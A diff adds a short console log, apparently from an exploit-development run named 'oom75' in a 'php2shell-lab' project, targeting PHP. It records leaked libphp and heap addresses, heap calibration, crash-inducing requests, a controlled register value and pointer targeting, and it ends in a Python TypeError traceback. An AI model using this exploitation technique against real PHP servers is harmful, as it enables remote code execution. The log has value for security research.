@@ -1,0 +1,17 @@
+=== oom75: calibration + aimed dispatch ===
+[0] envelope ok (13590311 B)
+    libphp=0x7f228625b000 heap=0x7f22845f6000 VA0(guess)=0x7f22845f7718
+[1] warm (11 fires, calibration tile values)
+    warm done
+[2] sacrifice + calibration finishers (<=3, until crash)
+  cal-fire0: 200 b'<br />\n<b>Fatal error</b>:  Allowed memory size of 8388608 b'
+  cal-fire1: ERR b'<urlopen error [Errno 32] Broken pipe>'
+    rdi=4141414141410000
+    phi=0 VA0=0x7f2283a01718 (hits=1)
+    rc=1 at VA0+3584: True (0100000008010000)
+    window pointer -> 0x7f2283a02520
+Traceback (most recent call last):
+  File "/Users/vlad/Projects/queue/php2shell-lab/oom75.py", line 221, in <module>
+    T_aim[phi:phi + 8] = struct.pack("<Q", TARGET)
+    ~~~~~^^^^^^^^^^^^^
+TypeError: 'bytes' object does not support item assignment
